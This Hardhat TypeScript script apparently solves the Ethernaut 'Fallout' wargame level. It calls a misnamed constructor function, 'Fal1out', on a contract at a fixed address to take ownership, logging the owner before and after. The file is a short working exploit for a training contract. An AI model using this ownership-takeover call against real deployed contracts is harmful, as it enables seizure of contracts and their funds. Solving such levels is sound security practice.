import { ethers } from "hardhat";
import fallback_deployment from "../deployments/localhost/Fallback_implementation.json";
import { MinEthersFactory } from "../typechain-types/common";
import * as hre from '@nomiclabs/hardhat-ethers';
import {Fallout} from '../typechain-types/Fal1out.sol/Fal1out';

async function mainLocal() {
    
    const levelAddress = "0xf46B0e5ed3De4C48F424F298A5b10d5d49C4a67C";

    //let contract = await fallback.attach(fallbackLevelAddress) as Fallback;

    const [deployer] = await ethers.getSigners();
    console.log('deployer', deployer.address);

    const MyContract = await ethers.getContractFactory("Fallout");
    const contract = await MyContract.attach(levelAddress) as Fallout;

    console.log('owner', await contract.owner());

    // hack - Fal1out function is a disguised constructor, allowing adversary to simply call
    // it and become owner.
    await contract.connect(deployer).Fal1out({value: ethers.utils.parseEther("0.000001")});
    console.log('owner', await contract.owner());


}

mainLocal().catch((error) => {
    console.error(error);
    process.exit(1);
});